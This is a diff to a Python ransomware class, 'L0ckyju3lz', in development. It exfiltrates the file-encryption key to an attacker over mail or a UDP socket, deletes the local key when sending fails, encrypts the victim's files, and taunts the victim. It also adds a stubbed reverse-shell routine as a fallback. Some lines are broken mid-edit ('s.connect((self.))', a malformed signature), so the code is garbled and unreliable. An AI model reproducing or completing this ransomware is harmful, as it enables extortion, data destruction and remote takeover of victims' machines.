@@ -37,15 +37,19 @@ class L0ckyju3lz():
 
         # Mail & BTC Details
         self.btc_wallet = ""
-        self.response_mail = ""
+        self.response_mail = ""  # used for sendkey over mail
 
-        # Socket Details
-        self.server_ip = None
-        self.server_port = None
+        # Socket details for sendkey over udp stream
+        self.server_ip_key = ""
+        self.server_port_key = 0
+
+        # Socket details for reverse shell
+        self.server_ip_rshell = ""
+        self.server_port_rshell = 0
 
         # SMTP Details
         self.host = ""
-        self.port = ""
+        self.port = 0
         self.username = ""
         self.password = ""
 
@@ -104,9 +108,12 @@ class L0ckyju3lz():
 
     def send_key(self):
         # Try two methods
-        if self.over_mail(): return True
-        elif self.over_udp_client(): return True
-        else: return False
+        if self.over_mail() or self.over_udp_client():
+            return
+        else:
+            # Just delete the key
+            os.remove(self.archiv_name)
+            return
 
     def over_mail(self):
         try:
@@ -132,14 +139,16 @@ class L0ckyju3lz():
     def over_udp_client(self):
         try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
-                message = self.client_ID + ";" + self.key
-                s.sendto(message.encode(), (self.server_ip, self.server_port))
-            return True
+               message = self.client_ID + ";" + self.key
+               s.sendto(message.encode(), (self.server_ip_key, self.server_port_key))
+               return True
         except:
             return False
 
     def reverse_shell(self):
-        pass
+        with socket.socket() as s:
+            s.connect((self.))
+
 
     def crypt_file(self, *,, mode=None):
         if mode == 'enc':
@@ -200,14 +209,14 @@ class L0ckyju3lz():
         if self.pack_key(): pass
         else: sys.exit(0)
         # send key
-        if self.send_key(): pass
-        else: sys.exit(0)
+        self.send_key()
         # crypt
         if self.crypt_file(mode='enc'):
             del self.crypt
             del self.key
             print("Start crying little baby ...")
         else:
+            # Okay, encryption fails - lets try to start a reverse shell than ...
             sys.exit(0)
 
 
